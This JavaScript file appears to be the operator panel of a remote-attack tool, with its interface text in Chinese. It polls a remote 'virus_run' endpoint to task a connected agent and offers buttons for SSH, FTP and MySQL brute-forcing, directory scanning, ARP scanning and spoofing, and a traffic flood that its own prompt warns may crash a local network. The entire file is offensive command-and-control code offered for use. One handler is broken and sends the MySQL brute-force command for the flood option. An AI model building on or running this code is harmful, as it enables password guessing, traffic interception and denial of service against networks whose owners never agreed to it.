
var get_message = null;
var user = getCookie("user");
var pwd = getCookie("pwd");
var command = 'none';
var send_ok = false;

function send_command(cmd) {
    command = cmd;
    try{
        get_message.send(JSON.stringify({"command": cmd}));
        print_log("发送命令: "+ command);
    } catch(e) {
        var loop = setInterval(function() {
            try {
                get_message.send(JSON.stringify({"command": command}));
                clearInterval(loop);
                return;
            }catch(e) {
                return;
            }
        } , 100)
    }
}

function deal_ssh_brute() {
    showInputBox("输入参数","" , "输入目标IP:",function(ip){
        showInputBox("输入参数","" , "输入端口:",function(port){
            showInputBox("输入参数","" , "输入用户名:",function(user){
                send_command("ssh_brute "+ip+" "+port+" "+user);
            });
        });
    });
}

function deal_ftp_brute() {
    showInputBox("输入参数","" , "输入目标IP:",function(ip){
        showInputBox("输入参数","" , "输入端口:",function(port){
            showInputBox("输入参数","" , "输入用户名:",function(user){
                send_command("ftp_brute "+ip+" "+port+" "+user);
            });
        });
    });
}

function deal_mysql_brute() {
    showInputBox("输入参数","" , "输入目标IP:",function(ip){
        showInputBox("输入参数","" , "输入端口:",function(port){
            showInputBox("输入参数","" , "输入用户名:",function(user){
                send_command("mysql_brute "+ip+" "+port+" "+user);
            });
        });
    });
}

function deal_traffic_attack() {
    showInputBox("输入参数","" , "输入目标网址:",function(ip){
        showInputBox("输入参数","" , "输入，模拟用户的数量:",function(port){
            showInputBox("注意，可能导致局域网网络崩溃","" , "输入一个模拟用户的发送攻击数量:",function(user){
                send_command("mysql_brute "+ip+" "+port+" "+user);
            });
        });
    });
}

function deal_arp_spoof() {
    showRightAlert("如果想要停止攻击,则点击关闭arp攻击按钮",5000);
    showInputBox("输入参数","" , "输入目标设备的IP:",function(ip){
        send_command("arp_spoof "+ip);
    });
}



var hacker_driver_xhr = new XMLHttpRequest();
hacker_driver_xhr.open("GET", remote+ "/api/web_virus/"+user+"/"+pwd+"/", true);
hacker_driver_xhr.send();
hacker_driver_xhr.onload = function() {
    var driver_code = hacker_driver_xhr.responseText;
    document.getElementById("driver_code").innerHTML = "识别码: "+ driver_code;
    print_log("驱动识别码加载成功")


    var local_fn = document.getElementById("local_fn");

    var run = setInterval(function() {

    try {
        get_message = new XMLHttpRequest();
        get_message.open(
            'POST',remote+"/virus_run/"+driver_code+"/" , true);
        get_message.send(JSON.stringify({"command": command}));
        command = 'none';
        get_message.onload = function() {
        var r = get_message.responseText;
        if (r.replace('\n','') != 'none'){
            document.getElementById("local_console").style.display = "block";
            document.getElementById("local_console_content").innerHTML = String(r).replaceAll("\n","<br />");
            console.log(r);
            try{
            var message = JSON.parse(r);
            if ("IP" in message && "os" in message) {
            document.getElementById("driver_ip").innerText = "IP: "+ message["IP"];
            document.getElementById("driver_os").innerText = "系统: "+ message["os"];
            local_fn.innerHTML = "";
            console.log(message);
            for (var i in message) {
            if (i != "IP" && i!= "os") {
                console.log(message[i]);
                (function(i){
                var dom = document.createElement("button");
                dom.innerText = i;
                dom.id = message[i]['Command'];
                dom.className = "btn_3";
                local_fn.appendChild(dom);

                dom.onclick = function() {
                    if (dom.id == 'dirb'){
                        showInputBox("输入参数","dirb" , "输入关于目标网站:", send_command);
                        return;
                    }
                    else if (dom.id == 'ssh_brute') {
                        deal_ssh_brute();
                        return;
                    }
                    else if (dom.id == 'ftp_brute') {
                        deal_ftp_brute();
                        return;
                    }
                    else if (dom.id == 'mysql_brute') {
                        deal_mysql_brute();
                        return;
                    }
                    else if (dom.id == 'traffic_attack') {
                        deal_traffic_attack();
                        return;
                    }
                    else if (dom.id == 'arp_scan') {
                        send_command("arp_scan");
                        return;
                    }
                    else if (dom.id == 'arp_spoof') {
                        deal_arp_spoof();
                        return;
                    
                    }
                }
            }) (i) ;}
        }}
        else {
            if (String(r) == '') {
                return;
            }
            showAlert_Console(r , null , function() {
                command = 'none';
            })
        } command = 'none'}catch(e){ return; }}
    } 
    }catch(e){
        return;
    }
    } , 800);
}